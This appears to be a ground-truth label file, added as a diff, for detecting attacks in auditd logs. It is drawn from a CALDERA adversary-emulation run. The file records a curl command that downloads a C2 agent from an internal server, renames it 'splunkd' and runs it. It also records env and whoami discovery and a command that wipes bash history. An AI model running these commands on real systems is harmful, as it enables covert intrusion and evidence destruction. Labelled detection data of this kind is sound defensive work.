@@ -1,0 +1,84 @@
+{
+ "category": "attack",
+ "malicious_event_ids": [
+  "run1_web01_1230:auditd:6",
+  "run1_web01_1230:auditd:7",
+  "run1_web01_1230:auditd:8",
+  "run1_web01_1230:auditd:9",
+  "run1_web01_1230:auditd:10",
+  "run1_web01_1230:auditd:11",
+  "run1_web01_1230:auditd:12",
+  "run1_web01_1230:auditd:13",
+  "run1_web01_1230:auditd:14",
+  "run1_web01_1230:auditd:15"
+ ],
+ "abilities": [
+  {
+   "name": "Agent deployment",
+   "status": "success",
+   "technique_id": "T1105",
+   "command": "curl -s -X POST -H file:sandcat.go -H platform:linux -H architecture:arm64 http://192.168.2.7:8888/file/download ; chmod +x splunkd ; ./splunkd -server http://192.168.2.7:8888 -group red -v",
+   "event_ids": [
+    "run1_web01_1230:auditd:6",
+    "run1_web01_1230:auditd:7",
+    "run1_web01_1230:auditd:8",
+    "run1_web01_1230:auditd:9",
+    "run1_web01_1230:auditd:10"
+   ],
+   "bootstrap": false,
+   "deployment": true,
+   "process_event_ids": [
+    "run1_web01_1230:auditd:6",
+    "run1_web01_1230:auditd:8",
+    "run1_web01_1230:auditd:9"
+   ]
+  },
+  {
+   "name": "Environment variables discovery on freebsd, macos and linux",
+   "status": "success",
+   "technique_id": "T1082",
+   "command": "env",
+   "event_ids": [
+    "run1_web01_1230:auditd:12",
+    "run1_web01_1230:auditd:13"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "run1_web01_1230:auditd:12",
+    "run1_web01_1230:auditd:13"
+   ]
+  },
+  {
+   "name": "Current User",
+   "status": "success",
+   "technique_id": "T1033",
+   "command": "whoami",
+   "event_ids": [
+    "run1_web01_1230:auditd:14",
+    "run1_web01_1230:auditd:15"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "run1_web01_1230:auditd:14",
+    "run1_web01_1230:auditd:15"
+   ]
+  },
+  {
+   "name": "Bootstrap T1070.003",
+   "status": "success",
+   "technique_id": "T1070.003",
+   "command": "> $HOME/.bash_history && unset HISTFILE",
+   "event_ids": [
+    "run1_web01_1230:auditd:11"
+   ],
+   "bootstrap": true,
+   "deployment": false,
+   "process_event_ids": [
+    "run1_web01_1230:auditd:11"
+   ]
+  }
+ ],
+ "source": "CALDERA report test2_report.json + bootstrap actions from ground_truth.json: step pid + descendants, agent lineage"
+}
